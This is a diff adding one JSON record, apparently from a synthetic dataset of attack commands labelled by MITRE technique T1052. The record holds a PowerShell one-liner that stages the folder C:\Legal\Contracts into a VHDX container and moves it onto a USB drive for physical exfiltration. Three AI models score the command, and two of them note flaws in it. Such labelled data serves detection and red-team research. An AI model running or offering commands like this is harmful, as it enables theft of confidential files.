@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $env:TEMP 'work.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); Copy-Item 'C:\\Legal\\Contracts' -Destination \"$($dl):\\C\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd; Move-Item $vhd (Join-Path $usb 'work.vhdx') -Force",
+  "explanation": "Stages data into a locally mounted VHDX, then moves the container onto the USB to minimize file I/O on the removable volume.",
+  "rationale_steps": [
+    "Mount local VHDX container",
+    "Copy sensitive files into container",
+    "Dismount to flush changes",
+    "Move VHDX onto the USB device for physical exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-ad4e6ef4",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, valid cmdlets/parameters, and proper separators.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually aligns with staging to a VHDX then moving to USB, but it never creates/initializes the VHDX and likely requires elevation to mount, so it is only partially operationally plausible.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T07:54:02.871438Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced quotes, parentheses, and valid cmdlet usage, though the array index access on the Get-Volume pipeline result (`[0]`) and the string concatenation for `$usb` are slightly fragile constructs that could fail in edge cases.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by discovering a removable USB drive, mounting a VHDX container from TEMP to stage sensitive data (C:\\Legal\\Contracts) with minimal direct I/O on the removable medium, then dismounting and moving the container to the USB — a realistic and operationally plausible exfiltration-over-physical-medium technique.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:35:03.037901Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax, including proper variable assignment, piping, sub-expressions for string interpolation, and valid cmdlet flags.",
+        "semantic_score": 3,
+        "semantic_justification": "The command fails to create the VHDX file (e.g., via New-VHD) before attempting to mount it, and Mount-DiskImage typically requires administrative privileges which contradicts the 'None' privilege level specified.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:35:08.442577Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
